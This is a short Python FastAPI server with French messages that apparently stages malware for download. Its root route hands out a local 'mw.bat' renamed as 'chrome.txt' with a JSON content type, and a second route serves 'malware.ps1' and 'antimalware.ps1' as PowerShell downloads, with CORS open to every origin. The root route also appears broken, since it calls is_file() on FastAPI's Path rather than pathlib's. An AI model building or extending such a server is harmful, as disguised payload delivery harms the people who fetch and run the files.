from typing import Annotated
from fastapi import FastAPI, Path
from fastapi.responses import FileResponse
from pathlib import Path as PathLibPath
from fastapi.middleware.cors import CORSMiddleware

app = FastAPI()

origins = ["*"]

app.add_middleware (
    CORSMiddleware, 
    allow_origins=origins,
    allow_credentials=True, 
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.get("/")
async def root():
    target_path = Path("./app/mw.bat")
    if target_path.is_file():
        return FileResponse(path=target_path, filename="chrome.txt", media_type="application/json")
    else:
        return {"message": "rien"}
    
@app.get("/download/{filename}")
async def download_file(filename: Annotated[str, Path(title="file to download")]):
    target_path = PathLibPath(f"./{filename}")
    if filename in ("malware.ps1", "antimalware.ps1") and target_path.is_file():
        return FileResponse(path=target_path, media_type='application/ps1', filename=filename)
    return {"error": "Fichier not Found"}

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)